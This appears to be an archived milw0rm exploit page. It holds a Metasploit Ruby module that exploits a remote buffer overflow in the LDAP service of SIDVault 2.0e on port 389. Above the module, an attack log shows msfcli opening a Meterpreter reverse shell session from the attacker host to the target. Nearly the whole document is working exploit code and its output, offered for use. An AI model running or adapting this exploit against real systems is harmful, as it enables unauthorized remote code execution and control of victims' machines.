<html><head><title>SIDVault 2.0e Windows Remote Buffer Overflow Exploit (meta)</title></head><pre>#--attack-log--
#attacker@dz-labs:~/pentests/metasploit/framework-3.2/trunk$ ./msfcli exploit/windows/ldap/sidvault_ldap #PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.2 RHOST=192.168.1.3 E
#[*] Please wait while we load the module tree...
#[*] Handler binding to LHOST 0.0.0.0
#[*] Started reverse handler
#[*] Sending stage (718336 bytes)
#[*] Meterpreter session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.3:1076)

#meterpreter &gt;


##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 &lt; Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           =&gt; 'SIDVault 2.0e Windows Remote Buffer Overflow',
			'Description'    =&gt; %q{
				This exploits a buffer overflow in the LDAP service that is
				part of the SIDVault product. This module was tested against
				version 2.0e.
					
			},
			'Author' 	 =&gt; [ 'His0k4 &lt;his0k4.hlm[at]gmail.com&gt;' ],
			'License'        =&gt; MSF_LICENSE,
			'Version'        =&gt; '$Revision$',
			'References'     =&gt;
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/9586'],

				],
			'Privileged'     =&gt; true,
			'Payload'        =&gt;
				{
					'Space'    =&gt; 750,
					'BadChars' =&gt; &quot;\x00&quot;,
					'StackAdjustment' =&gt; -3500,
					'EncoderType'   =&gt; Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =&gt;  'True',
				},
			'Platform'       =&gt; 'win',
			'Targets'        =&gt; 
				[
					#Tested against xp_sp3 OK
					[&quot;Universal&quot;,   { 'Ret' =&gt; &quot;\x29\x10\x40&quot; }], #p/p/r sidvault.exe
				],
			'DefaultTarget' =&gt; 0))
			
			register_options(
				[
					Opt::RPORT(389)
				], self.class)
	end

	def exploit
		connect
		
		sploit = &quot;\x30\x82\x12\x10\x02\x01\x01\x60\x82\x12\x09\x02\x01\x03\x04\x82\x10\xfe&quot;	
		sploit &lt;&lt; &quot;dc=&quot;	
		sploit &lt;&lt; rand_text_alpha(1028)
		sploit &lt;&lt; payload.encoded
		sploit &lt;&lt; rand_text_alpha(3302 - payload.encoded.length)
		sploit &lt;&lt; &quot;\xE8\x15\xF3\xFF\xFF&quot;
		sploit &lt;&lt; make_nops(5)
		sploit &lt;&lt; &quot;\xEB\xF4\x90\x90&quot;
		sploit &lt;&lt; target.ret
		sploit &lt;&lt; &quot;\x80\x82\x01\x00&quot;
		sploit &lt;&lt; rand_text_alpha(500)
		
		sock.put(sploit)
		
		handler
	end

end

# milw0rm.com [2009-09-04]</pre></html>